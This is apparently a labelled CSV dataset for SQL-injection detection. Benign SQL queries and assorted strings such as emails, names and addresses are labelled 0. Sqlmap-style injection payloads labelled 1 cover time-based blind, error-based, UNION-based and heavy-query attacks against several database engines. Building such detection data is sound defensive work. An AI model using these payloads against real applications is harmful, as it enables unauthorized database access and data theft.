query,label
select * from anomaly_reports where id = 1 or id = 2 or id = 3,0
"1'  )   where 8586  =  8586 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
perr@pasajesaereosbaratos.pm,0
lazlo,0
select avg ( butter ) from cream select sum ( shorter ),0
"select employees.knowledge, count ( orders.lifeid )  as potatoesfrom    ( ordersinner join carbon on orders.crowdid  =  employees.sweetid )",0
"iif  (  1095  =  2853,1,1/0  )",1
"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
select count ( actually )  from brush,0
5.79616e+15,0
"select orders.streamrid, employees.run, employees.wear from ordersright join employees on orders.employeeid  =  employees.catid order by orders.unusualid",0
"1""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"select jet, city+ ', ' + soil+ ' ' + growth+ ', ' + entire as wrote  from play",0
fnico,0
"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-8349  )   union all select 8126,8126#",1
"select column_name ( s )  from meal,happened",0
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",1
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )",1
childree,0
1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
select * from else where dish between '1996-07-01' and '1996-07-31',0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  9481  =  9481",1
select name from syscolumns where id   =     (  sele ...,1
coe,0
"select composition, mostly+ ', ' + eaten+ ' ' + task+ ', ' + village as lose  from wall",0
"select * from soldier order by government asc, chamber desc",0
select avg ( stream ) from reader select sum ( drink ),0
"1   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   2939  =  2939",1
"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",1
select pg_sleep  (  5  )   and    (    (     (  'mgbm' like 'mgbm,1
limpi$aas,0
"select sitid as id, drop as reach from care",0
shih_brusse@professionalhost.jp,0
"-6368' union all select 6529,6529,6529--",1
"-8734%""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1
"end and    (    (   ""dmgj""  =  ""dmgj",1
from  ( select distinct wood from roof ),0
select * from couple where herself  between 10 and 20,0
4271,0
calle pintor el greco 102 1-g,0
"-5014%""   )    )     )   or 3348  =  2430--",1
"select * from direction order by atom asc, swimming desc",0
9.97465e+15,0
3.00245e+15,0
lim@marketingmunicipal.bf,0
"-3362' where 6567  =  6567 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs,1
60210107v,0
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"select * from scared where which not in  ( 'unless', 'island', 'managed' )",0
-5020%'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1
correa cachopo,0
"select plant,press,daughter,sand,connected     (  (  guard join leader on current.gradually =  better.silence )   inner join readeron orders.young =  explain.parallelid )",0
select fruit ( s )  from recognize union,0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy",1
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",1
select * from children where active = 'quiet' fetch first 3 rows only,0
select farm from back union select were from band order by ran,0
select park from divide,0
"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",1
"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
valverde de la virgen,0
"-5572""  )   union all select 8131,8131#",1
select population ( s ) from star inner join,0
select * from volume where child in  ( select ought from third ),0
select buffalo from reach,0
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",1
mccollon@irmedia.ca,0
select * from made where price not between 10 and 20,0
"calle gibraltar, 88",0
select distinct roof from trail,0
1'  )   as wtev where 5283  =  5283,1
"select * from thy where stems between ""suit"" and    ""breath""",0
select bridge ( s )  from able select thing ( s ),0
"1"" and 6637  =  2321",1
1'  )   rlike   (  select   (  case when   (  7447  =  3981  )   then 1 else 0x28 end   )    ),1
oblong0,0
ensminge,0
4.47104e+15,0
select option_value from wp_options where option_name  =  'options_facebook_url' limit 1,0
"insert into youth ( give, freedom, chosen, heavy, buried, how )  values  ( 'blanket', 'satisfied'. whatever', 'half', 'yellow', 'exciting', 'signal' )",0
select were ( s ) from snake inner join,0
select * from important where news  between 10 and 20,0
delete from because where deeply = 'quickly',0
1' where 1557  =  1557,1
1.16e+15,0
4.61733e+15,0
2.82e+15,0
select * from gulf where stream in  ( select flame from got ),0
"end and    (    (     (  ""poee""  =  ""poee",1
select * from customers  order by country desc;,0
"select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1
1'+  (  select 'ncny' where 5634  =  5634,1
brenn,0
ibazeta montells,0
from  ( select distinct scared from respect ),0
select option_value from wp_options where option_name  =  '_options_footer_button_3_link' limit 1,0
apo695169or6,0
select sudden from cause union select hospital from straw order by pleasure,0
mascarino.marenghi@cocheacoche.lv,0
delete from nearest,0
*|,1
1' and 4374  =  2305,1
h9erc5,0
"-4746%""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
select * from  ( select slide from breath ),0
select * from smallest fetch first 50 percent rows only,0
select avg ( price ) from consider,0
select * from careful fetch first 50 percent rows only,0
"1  )   as otsb where 8380  =  8380 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
select min ( symbol )  as while from hurried,0
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )",1
6.09196e+15,0
select option_value from wp_options where option_name  =  '_options_cell_number' limit 1,0
bradney4,0
"select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
"select anybody, rough+ ', ' + wide+ ' ' + laid+ ', ' + folks as yet  from clay",0
select * from fell fetch first 50 percent rows only,0
update stared set canal = 'drove'where pale = 'store',0
"select forgot,becoming,health from bag left join orders on island.experienceid =  cast.keep order by dream.reach",0
select avg ( behavior ) from club,0
select * from scene where apple between '1996-07-01' and '1996-07-31',0
select * from cave where card between '1996-07-01' and '1996-07-31',0
"select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1
"select adddate ( ""2017-06-15"", interval 10 day ) ;",0
"select speedid as id, win as proper from add",0
ntpadmin,0
almcita,0
1   )    )     )   or sleep  (  5  )  #,1
select count ( * )  as favorite,0
palmera,0
"select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1
"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
-2751 where 6334  =  6334 or   (  9668  =  5845  )  *5845--,1
"c/ virgen de la paloma, 107",0
4.97885e+15,0
"1,  (  select   (  case when   (  8674  =  7896  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )",1
select * from third where    not habit = 'design',0
"1"" where 9241  =  9241 union all select null#",1
select * from east where tropical between '1996-07-01' and '1996-07-31',0
3.82074e+15,0
30555153k,0
procedure,1
select shells ( s )  from people select he ( s ),0
"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",1
mallat paiva,0
select top 50 percent * from today select * from taught fetch first 50 percent rows onlyselect top 3 * from improve,0
"1""   )    )    order by 1--",1
"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349",1
select top 3 * from store where giant = 'graph',0
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx",1
select rand (  ) * ( 10-5 ) +5;,0
select top 50 percent * from eventually,0
72219452g,0
select min ( cheese )  as correctly from store,0
"select nutsid as id, scientist as orbit from quick",0
clodettes_pierson@repretexbcn.ml,0
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",1
"select after,instance from cheese where wise = 'wall' union select consonant, cave from plane",0
-3125'   )    )     )   order by 1#,1
select * from have fetch first 50 percent rows only,0
"1""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""eslj"" like ""eslj",1
"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
f36hu1a,0
select therefore ( s )  from weak select pleasant from radio,0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,1
"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,1
"o casal 135, 4?a",0
from  ( select distinct hit from balloon ),0
"-2855""   )    )     )   union all select 1496,1496,1496,1496#",1
"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",1
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh",1
-8187'   )    )     )   or 1698  =  2823#,1
"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )",1
"1' where 1628  =  1628 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
select option_value from wp_options where option_name  =  '_transient_timeout_houzez_verification_success' limit 1,0
"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",1
blava,0
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'krvo' like 'krvo,1
select avg ( loud )  from chance  select sum ( mice ),0
2561,0
2008,0
7.50908e+15,0
"1'  )   and elt  (  7554  =  6257,6257  )   and   (  'bpzm'  =  'bpzm",1
select count ( pine )  from cut,0
select avg ( various )  from stop  select sum ( women ),0
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,1
"1   )    )     )   union all select null,null,null--",1
select * from attention where famous like '%floor%',0
"1"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'+  (  select 'wsjk' where 3291  =  3291,1
select * from accurate where branch between 'handsome' and 'although',0
-3462'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'cxku' like 'cxku,1
